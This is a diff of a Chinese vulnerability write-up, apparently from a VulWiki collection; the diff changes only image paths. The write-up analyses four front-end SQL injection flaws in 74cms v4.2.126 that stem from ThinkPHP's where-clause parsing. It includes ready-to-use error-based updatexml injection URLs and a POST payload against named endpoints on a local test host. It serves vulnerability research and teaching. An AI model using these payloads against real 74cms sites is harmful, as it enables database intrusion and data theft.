@@ -25,31 +25,31 @@
 
     'SHOW_PAGE_TRACE'        =>  true,
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId25.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId25.png)
 
 然后打开文件：74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php添加代码：
 
     $uid = I('GET.uid');
     M('CompanyProfile')->field('companyname,logo')->where(array('uid'=>$uid))->find();
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId26.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId26.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId27.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId27.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId28.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId28.png)
 
 我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数
 I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId29.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId29.png)
 
 神奇的I函数路径:ThinkPHP\\Common\\functions.php方法名：function I(\$name,\$default=\'\',\$filter=null,\$datas=null)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId30.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId30.png)
 
 这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think\_filter 函数进行过滤think\_filter函数分析
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId31.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId31.png)
 
     例如：
         没有使用think_filter 函数时
@@ -63,7 +63,7 @@ I 所以也是没有框架注入这一说。这里又要重新重复讲解I函�
 
 接着我们直接打开文件：74cms\\upload\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId32.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId32.png)
 
     think_filter函数与上图两者对比一下，是否发现多点了东西？
     是的没错了。
@@ -77,21 +77,21 @@ I 所以也是没有框架注入这一说。这里又要重新重复讲解I函�
 
     接着查看：parseWhereItem( 方法
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId33.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId33.png)
 
 使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 \$str 而 \$str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 "双引号"
 而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件：
 74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId34.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId34.png)
 
     输入url: http://74cms.test/index.php?m=Home&c=index&a=index&uid[0]=match&uid[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) – a
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId35.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId35.png)
 
 这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()-\>where(\$test)-\>xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId36.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId36.png)
 
 前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看
 : )
@@ -101,24 +101,24 @@ I 所以也是没有框架注入这一说。这里又要重新重复讲解I函�
 
 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php方法：function company\_focus(\$company\_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId38.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId38.png)
 
 注册完成以后登录前台即可如果不登录的话，会显示这个样子url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company\_focus
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId39.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId39.png)
 
     http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) -- a
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId40.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId40.png)
 
 看源码
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId41.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId41.png)
 
 打开文件：
 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php方法：add\_focus(
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId42.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId42.png)
 
 0x05 74cms独有框架漏洞第二处
 ----------------------------
@@ -129,9 +129,9 @@ image
 
 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId44.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId44.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId45.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId45.png)
 
 注册完成以后登录前台即可
 
@@ -140,48 +140,48 @@ image
     如果不登录的话，会显示这个样子
     url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId46.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId46.png)
 
     http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) -- a
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId47.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId47.png)
 
 看源码
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId48.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId48.png)
 
 打开文件：
 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php方法：add\_focus(
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId49.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId49.png)
 
 0x06 74cms独有框架漏洞第二处
 ----------------------------
 
 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php方法：order\_pay\_finish(是否需登录：需要登录权限：企业用户即可看源码
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId51.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId51.png)
 
 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId52.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId52.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId53.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId53.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId54.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId54.png)
 
 注册完成以后登录前台即可
 
     url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa") and updatexml(1,concat(0x7e,(select user())),0) – a
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId55.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId55.png)
 
 0x07 74cms独有框架漏洞第三处
 ----------------------------
 
 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php方法：register(是否需登录：不需要
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId57.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId57.png)
 
     url: 
     http://74cms.test/index.php?m=&c=Members&a=register
@@ -195,7 +195,7 @@ image
       Content-Type: application/x-www-form-urlencoded
       X-Requested-With: XMLHttpRequest
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId58.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId58.png)
 
     这里我要大概讲一下参数的问题
     post: 
@@ -229,15 +229,15 @@ image
         members_bind_info[type][0]=match;
     members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId60.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId60.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId61.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId61.png)
 
 看源码
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId62.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId62.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.126-前台四处sql注入/media/rId63.png)
+![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId63.png)
 
 四、参考链接
 ------------
